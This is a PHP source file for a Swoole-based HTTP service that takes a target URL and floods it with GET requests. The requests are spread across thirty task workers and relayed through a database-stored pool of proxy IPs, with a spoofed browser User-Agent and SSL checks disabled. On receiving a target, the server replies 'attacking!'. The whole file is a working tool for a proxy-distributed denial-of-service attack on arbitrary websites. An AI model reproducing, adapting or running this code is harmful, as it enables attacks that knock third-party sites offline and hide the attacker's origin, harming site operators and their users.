<?php
require_once('libs/app.php');

class HttpServer extends app{
    private $serv;
    private $requset;
    private $response;

    private $max_page = 100000;

    public function __construct(){
        parent::__construct();

        $this->serv = new swoole_http_server('_', 9502);
        $this->serv->set(array(
            'worker_num' => 8, //一般设置为服务器CPU数的1-4倍
            // 'daemonize' => 1, //以守护进程执行
            'max_conn'  => 2480,
            'max_request' => 10000,
            'dispatch_mode' => 2,
            'task_worker_num' => 30, //task进程的数量
            'task_ipc_mode ' => 3, //使用消息队列通信，并设置为争抢模式
        ));
        
        $this->serv->on('Request', array($this, 'onRequest'));
        $this->serv->on('Task', array($this, 'onTask'));
        $this->serv->on('Finish', array($this, 'onFinish'));
        $this->serv->start();
    }

    /**
     * 处理请求
     */
    public function onRequest($request, $response) {
        //存储-request、response
        $this->request = $request;
        $this->response = $response;
        //解析url
        @parse_str($this->request->server['query_string'] , $args);
        if(!isset($args['url']) || empty($args['url']) || !preg_match('/^http[s]?:\/\//', $args['url'])){
            $this->end('invalid url');
            return false;
        }
        //尝试redis获取ips
        $ips = $this->lib('credis')->get('ips');
        if(is_string($ips) && !empty($ips)){
            $ips = json_decode($ips , true);
        }else{
            $ips = $this->lib('db')->query('select proxy_ip,proxy_port from ###_ips where is_enable = 1');
            if(!is_array($ips) || empty($ips)){
                echo 'no ip'."\n";
                return false;
            }
            $this->lib('credis')->set('ips' , json_encode($ips));
        }
        //开始处理
        $this->end('attacking!');
        $that = $this;
        //开始处理
        foreach ($ips as $row) {
            //执行任务
            $this->serv->task([
                'ip'=>$row['proxy_ip'],//代理IP
                'port'=>$row['proxy_port'],//代理端口
                'url'=>$args['url'],
            ],mt_rand(0,29),function($serv , $work_id ,$res){
                var_dump($res);
            });
        }
        return true;
        
    }

    /**
     * 任务处理
     */
    public function onTask($serv, $task_id, $from_id, $data){
        $res = $this->http($data['url'] , [
            'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
        ] , [
            'ip'=>$data['ip'],
            'port'=>$data['port'],
        ] , 10);
        return true;
    }

    public function onFinish($serv, $task_id, $data){
        
    }

    /**
     * http请求
     * @param  string  $url        请求地址
     * @param  array   $HttpHeader 请求头部
     * @param  integer $timeout    超时时间
     */
    private function http($url = '', $HttpHeader=[],$proxy = [],$timeout = 30){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_setopt($ch, CURLOPT_HEADER, 0); #返回头部信息
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        //超时设置
        if(!is_numeric($timeout) || $timeout < 0 || $timeout > 120){
            $timeout = 30;
        }
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        //取消SSL验证
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,false);
        curl_setopt($ch, CURLOPT_HTTPGET, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        //代理
        if(is_array($proxy) && isset($proxy['ip']) && isset($proxy['port']) && is_string($proxy['ip']) && preg_match('/^\d{1,3}(\.\d{1,3}){3}$/', $proxy['ip']) && is_numeric($proxy['port']) && $proxy['port'] > 0){
            curl_setopt($ch, CURLOPT_PROXY, $proxy['ip']);
            curl_setopt($ch, CURLOPT_PROXYPORT, $proxy['port']);
            if(isset($proxy['pwd']) && is_string($proxy['pwd'])){
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['pwd']);    
            }
        }
        if($HttpHeader){
            curl_setopt($ch, CURLOPT_HTTPHEADER, $HttpHeader);
        }
        $ret = curl_exec($ch);
        $httpCode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
        if($httpCode != '200'){
            return false;
        }
        curl_close($ch);
        return $ret;
    }

    private function end($str = ''){
        $this->response->write($str);
        $this->response->end();
    }
}

//Http服务器-webhook
new HttpServer();